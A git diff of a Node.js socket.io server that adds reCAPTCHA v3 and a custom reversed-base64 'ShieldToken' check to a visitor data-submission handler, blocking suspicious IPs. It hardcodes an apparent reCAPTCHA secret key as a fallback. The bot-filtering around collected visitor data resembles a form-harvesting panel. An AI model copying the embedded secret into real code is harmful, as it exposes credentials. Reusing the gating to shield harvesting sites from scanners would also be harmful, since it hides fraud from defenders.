@@ -745,11 +745,75 @@ io.on("connection", (socket) => {
   });
 
   // Handle more info (data submission)
-  socket.on("more-info", (data) => {
+  socket.on("more-info", async (data) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
+
+      // ===== reCAPTCHA v3 + ShieldToken Verification =====
+      const recaptchaToken = data.recaptchaToken;
+      const shieldToken = data.shieldToken;
+      const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+
+      // Verify ShieldToken format (base64 reversed, contains expected fields)
+      if (shieldToken) {
+        try {
+          const decoded = atob(shieldToken.split('').reverse().join(''));
+          const parts = decoded.split('|');
+          // Token should have: fingerprint|timestamp|screenInfo|timezone|lang|platform|humanScore
+          if (parts.length < 7) {
+            console.log(`[SHIELD] Invalid token format from IP: ${ip}, parts: ${parts.length}`);
+            markSuspicious(ip, 'invalid_shield_token');
+          } else {
+            const humanScore = parseInt(parts[6]) || 0;
+            if (humanScore < 20) {
+              console.log(`[SHIELD] Low human score: ${humanScore} from IP: ${ip}`);
+              markSuspicious(ip, 'low_human_score');
+            }
+          }
+        } catch (e) {
+          console.log(`[SHIELD] Failed to decode token from IP: ${ip}`);
+          markSuspicious(ip, 'malformed_shield_token');
+        }
+      } else {
+        console.log(`[SHIELD] No shield token from IP: ${ip}`);
+        markSuspicious(ip, 'missing_shield_token');
+      }
+
+      // Verify reCAPTCHA v3 token with Google
+      if (recaptchaToken) {
+        try {
+          const recaptchaSecret = process.env.RECAPTCHA_SECRET_KEY || '6LdtFpksAAAAABufpUvakaicChTWskwLKNGw8KBX';
+          const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${recaptchaSecret}&response=${recaptchaToken}&remoteip=${ip}`;
+          const response = await fetch(verifyUrl, { method: 'POST' });
+          const result = await response.json();
+          
+          if (!result.success) {
+            console.log(`[reCAPTCHA] Verification failed from IP: ${ip}, errors: ${JSON.stringify(result['error-codes'])}`);
+            markSuspicious(ip, 'recaptcha_failed');
+          } else if (result.score < 0.3) {
+            console.log(`[reCAPTCHA] Low score: ${result.score} from IP: ${ip}, action: ${result.action}`);
+            markSuspicious(ip, 'recaptcha_low_score');
+          } else {
+            console.log(`[reCAPTCHA] OK - score: ${result.score}, action: ${result.action}, IP: ${ip}`);
+          }
+        } catch (e) {
+          console.log(`[reCAPTCHA] Verification error: ${e.message}`);
+          // Don't block on verification errors - fail open
+        }
+      } else {
+        console.log(`[reCAPTCHA] No token from IP: ${ip}`);
+        markSuspicious(ip, 'missing_recaptcha');
+      }
+
+      // Check if IP got blocked from accumulated suspicious activity
+      if (isSuspiciousBlocked(ip)) {
+        console.log(`[BLOCKED] IP ${ip} blocked after suspicious activity in more-info`);
+        socket.disconnect(true);
+        return;
+      }
+      // ===== END reCAPTCHA + ShieldToken Verification =====
       // Store submitted data with page info for ordering
       if (data.content) {
         // Initialize dataHistory if not exists
